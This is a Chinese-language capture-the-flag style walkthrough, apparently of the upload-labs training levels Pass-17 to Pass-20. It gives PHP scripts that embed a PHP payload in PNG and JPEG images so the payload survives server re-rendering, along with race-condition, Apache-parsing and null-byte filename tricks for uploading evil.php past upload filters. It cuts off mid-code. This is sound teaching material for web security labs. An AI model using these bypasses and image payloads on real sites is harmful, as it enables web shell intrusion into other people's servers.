<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">$p = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,</span><br><span class="line">           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,</span><br><span class="line">           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,</span><br><span class="line">           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,</span><br><span class="line">           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,</span><br><span class="line">           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,</span><br><span class="line">           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,</span><br><span class="line">           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> ($y = <span class="hljs-number">0</span>; $y &lt; sizeof($p); $y += <span class="hljs-number">3</span>) {</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="hljs-number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="hljs-number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, $color);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="hljs-string">&apos;./1.png&apos;</span>);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x7528;php&#x8FD0;&#x884C;&#x540E;&#x5F97;&#x5230;1.png&#x4E0A;&#x4F20;&#x5373;&#x53EF;&#x3002;</p>
<ul>
<li>JPG&#xFF1A;</li>
</ul>
<p>JPG&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x56FD;&#x5916;&#x7684;&#x811A;&#x672C;&#x751F;&#x6210;</p>
<p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;</p>
<ol>
<li>&#x5148;&#x5C06;JPG&#x56FE;&#x7247;&#x4E0A;&#x4F20;&#x6E32;&#x67D3;&#x4E00;&#x6B21;</li>
<li>&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#xFF0C;&#x4F7F;&#x7528;&#x811A;&#x672C;&#xFF1A;<code>php xuanran.php 1.jpg</code></li>
<li>&#x5F97;&#x5230;pyload&#x56FE;&#x7247;&#x518D;&#x4E0A;&#x4F20;</li>
</ol>
<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    <span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="hljs-comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.</span></span><br><span class="line"><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    See also:</span></span><br><span class="line"><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="hljs-comment"></span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&apos;gd&apos;</span>) || !function_exists(<span class="hljs-string">&apos;imagecreatefromjpeg&apos;</span>)) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php-gd is not installed&apos;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($argv[<span class="hljs-number">1</span>])) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span>($pad = <span class="hljs-number">0</span>; $pad &lt; <span class="hljs-number">1024</span>; $pad++) {</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="hljs-keyword">new</span> DataInputStream($argv[<span class="hljs-number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="hljs-number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="hljs-number">0</span>;</span><br><span class="line">        $correctImage = <span class="hljs-keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span>($dis-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) {</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Incorrect SOI marker&apos;</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="hljs-number">0xFF</span>)) {</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="hljs-number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="hljs-keyword">if</span>($marker === <span class="hljs-number">0xDA</span>) {</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="hljs-number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="hljs-string">&apos;_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStreamTmp, <span class="hljs-keyword">TRUE</span>);</span><br><span class="line">                <span class="hljs-keyword">if</span>($extraBytes !== <span class="hljs-number">0</span>) {</span><br><span class="line">                    <span class="hljs-keyword">while</span>((!$dis-&gt;eof())) {</span><br><span class="line">                        <span class="hljs-keyword">if</span>($dis-&gt;readByte() === <span class="hljs-number">0xFF</span>) {</span><br><span class="line">                            <span class="hljs-keyword">if</span>($dis-&gt;readByte !== <span class="hljs-number">0x00</span>) {</span><br><span class="line">                                <span class="hljs-keyword">break</span>;</span><br><span class="line">                            }</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="hljs-number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="hljs-number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="hljs-number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                } <span class="hljs-keyword">elseif</span>($correctImage) {</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStream)) {</span><br><span class="line">                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Success!&apos;</span>);</span><br><span class="line">                } <span class="hljs-keyword">else</span> {</span><br><span class="line">                    <span class="hljs-keyword">break</span>;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    unlink(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>]);</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Something\&apos;s wrong&apos;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span><span class="hljs-params">($filename, $data, $unlink = FALSE)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="hljs-keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="hljs-keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="hljs-keyword">return</span> $correctImage;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span><span class="hljs-params">($errno, $errstr, $errfile, $errline)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="hljs-keyword">FALSE</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/(\d+) extraneous bytes before marker/&apos;</span>, $errstr, $m)) {</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($m[<span class="hljs-number">1</span>])) {</span><br><span class="line">                $extraBytes = (int)$m[<span class="hljs-number">1</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">private</span> $binData;</span><br><span class="line">        <span class="hljs-keyword">private</span> $order;</span><br><span class="line">        <span class="hljs-keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $order = false, $fromString = false)</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="hljs-keyword">if</span>(!$fromString) {</span><br><span class="line">                <span class="hljs-keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;File not exists [&apos;</span>.$filename.<span class="hljs-string">&apos;]&apos;</span>);</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                <span class="hljs-keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span><span class="hljs-params">($skip)</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) {</span><br><span class="line">                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);</span><br><span class="line">            }</span><br><span class="line">            $byte = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);</span><br><span class="line">            <span class="hljs-keyword">return</span> ord($byte);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) {</span><br><span class="line">                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);</span><br><span class="line">            }</span><br><span class="line">            $short = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);</span><br><span class="line">            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) {</span><br><span class="line">                $short = (ord($short[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">0</span>]);</span><br><span class="line">            } <span class="hljs-keyword">else</span> {</span><br><span class="line">                $short = (ord($short[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">1</span>]);</span><br><span class="line">            }</span><br><span class="line">            <span class="hljs-keyword">return</span> $short;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>&#x63D0;&#x793A;&#x9700;&#x8981;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#xFF1A;</p>
<p>&#x67E5;&#x770B;&#x6E90;&#x7801;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x5148;&#x4F1A;&#x628A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#xFF0C;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5F00;&#x59CB;&#x5224;&#x65AD;&#x540E;&#x7F00;&#xFF0C;&#x5982;&#x679C;&#x540E;&#x7F00;&#x4E0D;&#x5408;&#x6CD5;&#xFF0C;&#x5219;&#x5220;&#x9664;&#x6587;&#x4EF6;&#x3002;&#x5408;&#x6CD5;&#x7684;&#x8BDD;&#x5C31;&#x66F4;&#x6539;&#x540D;&#x79F0;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x5220;&#x9664;&#x65F6;&#x95F4;&#x5DEE;&#x7ED5;&#x8FC7;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x8FD8;&#x6CA1;&#x88AB;&#x5220;&#x9664;&#x7684;&#x65F6;&#x5019;&#x8BBF;&#x95EE;&#x5230;evil.php</p>
<ol>
<li>&#x4E0A;&#x4F20;evil.php&#x6587;&#x4EF6;</li>
<li>&#x7528;Brupsuite&#x6293;&#x5305;</li>
<li>&#x7528;Brupsuite&#x7684;&#x6D4B;&#x8BD5;&#x5668;&#xFF0C;&#x5C06;&#x7EBF;&#x7A0B;&#x6570;&#x8C03;&#x6574;&#x5230;20&#x4EE5;&#x4E0A;&#xFF0C;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5305;</li>
<li>&#x8BBF;&#x95EE;evil.php</li>
</ol>
<h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>&#x8FD9;&#x4E00;&#x5173;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E0A;&#x4F20;&#x91CD;&#x547D;&#x540D;&#x7ADE;&#x4E89;+Apache&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x3002;</p>
<p>&#x548C;&#x7B2C;17&#x5173;&#x4E00;&#x6837;&#xFF0C;&#x5148;&#x4E0A;&#x4F20;&#xFF0C;&#x540E;&#x5224;&#x65AD;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
<ol>
<li>&#x4E0A;&#x4F20;evil.php.7Z&#x6587;&#x4EF6;</li>
<li>&#x7528;Brupsuite&#x6293;&#x5305;</li>
<li>&#x7528;Brupsuite&#x7684;&#x6D4B;&#x8BD5;&#x5668;&#xFF0C;&#x5C06;&#x7EBF;&#x7A0B;&#x6570;&#x8C03;&#x6574;&#x5230;20&#x4EE5;&#x4E0A;&#xFF0C;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#x5305;</li>
</ol>
<p>&#x6210;&#x529F;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#xFF1A;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x88AB;&#x4E0A;&#x4F20;&#xFF0C;&#x4F46;&#x6CA1;&#x6709;&#x91CD;&#x547D;&#x540D;&#x3002;</p>
<p>&#x53EF;&#x80FD;&#x662F;&#x8FD9;&#x4E2A;lab&#x7684;&#x6E90;&#x7801;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x540D;&#x4F1A;&#x5BFC;&#x81F4;&#x6587;&#x4EF6;&#x540D;&#x53D8;&#x4E3A;&#x201D;uploadevil.php.7Z&#x201D;</p>
<p>&#x5C06;&#x6587;&#x4EF6;&#x540D;&#x6539;&#x4E3A;&#x201D;/evil.php.7Z&#x201D;&#x4E0A;&#x4F20;&#x5373;&#x53EF;</p>
<p>&#x6210;&#x529F;&#x4E4B;&#x540E;&#x8BBF;&#x95EE;&#x201D;evil.php.7Z&#x201D;&#x3002;</p>
<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>&#x548C;12&#x5173;&#x4E00;&#x6837;&#x7684;&#x89E3;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x901A;&#x8FC7;<code>$_POST</code>&#x65B9;&#x6CD5;&#x6765;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x540D;&#x3002;</p>
<ol>
<li>&#x5C06;<code>evil.php</code>&#x6539;&#x4E3A;&#xFF1A;<code>evil.php 1.jpg</code>(&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x7A7A;&#x683C;)</li>
<li>&#x4F7F;&#x7528;Brupsuite&#x7684;Hex&#xFF0C;&#x5C06;&#x5BF9;&#x5E94;&#x7A7A;&#x683C;&#x5904;&#x7684;20&#x6539;&#x4E3A;00</li>
<li>&#x4E0A;&#x4F20;</li>
</ol>
<p>&#x5C31;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x3002;</p>
<h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="hljs-keyword">false</span>;</span><br><span class="line">$msg = <span class="hljs-keyword">null</span>;</span><br><span class="line"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>])){</span><br><span class="line">    <span class="hljs-comment">//&#x68C0;&#x67E5;MIME</span></span><br><span class="line">    $allow_type = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;image/jpeg&apos;</span>,<span class="hljs-string">&apos;image/png&apos;</span>,<span class="hljs-string">&apos;image/gif&apos;</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span>(!in_array($_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;type&apos;</span>],$allow_type)){</span><br><span class="line">        $msg = <span class="hljs-string">&quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x7C7B;&#x578B;&#x6587;&#x4EF6;!&quot;</span>;</span><br><span class="line">    }<span class="hljs-keyword">else</span>{</span><br><span class="line">        <span class="hljs-comment">//&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x540D;</span></span><br><span class="line">        $file = <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&apos;save_name&apos;</span>]) ? $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;name&apos;</span>] : $_POST[<span class="hljs-string">&apos;save_name&apos;</span>];<span class="hljs-comment">//&#x5224;&#x65AD;save_name&#x662F;&#x5426;&#x88AB;&#x5B9A;&#x4E49;&#xFF0C;&#x5B9A;&#x4E49;&#x7684;&#x8BDD;&#x5C31;&#x7528;save_name</span></span><br><span class="line">        <span class="hljs-keyword">if</span> 